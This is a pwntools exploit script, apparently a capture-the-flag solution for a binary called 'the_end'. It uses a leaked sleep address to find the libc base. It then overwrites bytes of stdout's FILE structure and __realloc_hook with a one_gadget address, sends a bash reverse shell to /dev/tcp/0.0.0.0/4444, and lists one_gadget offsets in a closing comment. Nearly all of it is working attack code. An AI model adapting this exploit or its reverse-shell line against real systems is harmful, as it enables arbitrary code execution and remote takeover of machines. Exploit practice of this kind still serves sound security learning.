
from pwn import *
context.log_level='debug'
libc=ELF("./the_end").libc
p=process("./the_end")
#p=process('./the_end',env={"LD_PRELOAD":"/glibc/x64/2.23/lib/libc-2.23.so"})
#p=remote("0.0.0.0",8888)
#gdb.attach(p,'')
p.readuntil("gift ")
base=int(p.readuntil(',')[:-1],16)-libc.sym['sleep']
log.info(hex(base))
libc.address=base

address=libc.sym['_IO_2_1_stdout_']+0xd8
q=libc.got['realloc']-0x58
aim=libc.sym['__realloc_hook']

one=base+0xf02a4
q1=chr(q&0xff)
q2=chr((q>>8)&0xff)

p1=chr(one&0xff)
p2=chr((one&0xff00)>>8)
p3=chr((one&0xff0000)>>16)
p.send(p64(address))
p.send(q1)
p.send(p64(address+1))
p.send(q2)
p.send(p64(aim))
p.send(p1)
p.send(p64(aim+1))
p.send(p2)
p.send(p64(aim+2))
raw_input()
p.send(p3)

p.sendlineafter(")","/bin/bash -c 'bash -i >/dev/tcp/0.0.0.0/4444 0>&1'")
p.interactive()
'''
0x7fffffffdda8
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
